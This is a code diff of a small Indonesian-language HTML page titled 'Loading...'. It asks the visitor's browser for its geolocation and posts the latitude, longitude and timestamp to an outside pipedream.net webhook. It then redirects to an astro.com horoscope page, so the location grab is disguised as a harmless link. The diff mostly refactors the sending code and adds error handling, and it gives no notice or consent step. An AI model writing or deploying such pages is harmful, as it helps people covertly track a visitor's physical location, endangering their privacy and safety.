@@ -1,47 +1,56 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Loading...</title>
   <style>
-    html, body {
-      margin: 0;
-      padding: 0;
+    body {
       background: #fff;
+      color: #000;
+      font-family: sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
     }
   </style>
 </head>
 <body>
   <script>
     const webhookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
-    const redirectTo = "https://www.astro.com/horoscope";
+    const redirectToAstro = () => {
+      window.location.href = "https://www.astro.com/horoscope";
+    };
 
-    function redirect() {
-      window.location.href = redirectTo;
+    function sendLocation(position) {
+      const { latitude, longitude } = position.coords;
+      const timestamp = new Date().toISOString();
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude, timestamp })
+      })
+      .catch(() => {}) // Jika gagal tetap redirect
+      .finally(() => {
+        setTimeout(redirectToAstro, 1000);
+      });
     }
 
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const data = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            timestamp: new Date().toISOString()
-          };
+    function handleError() {
+      setTimeout(redirectToAstro, 1000);
+    }
 
-          fetch(webhookURL, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-          }).finally(() => {
-            setTimeout(redirect, 1000);
-          });
-        },
-        (error) => {
-          setTimeout(redirect, 2000);
-        }
-      );
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+        timeout: 10000
+      });
     } else {
-      setTi
+      handleError();
+    }
+  </script>
+</body>
+</html>
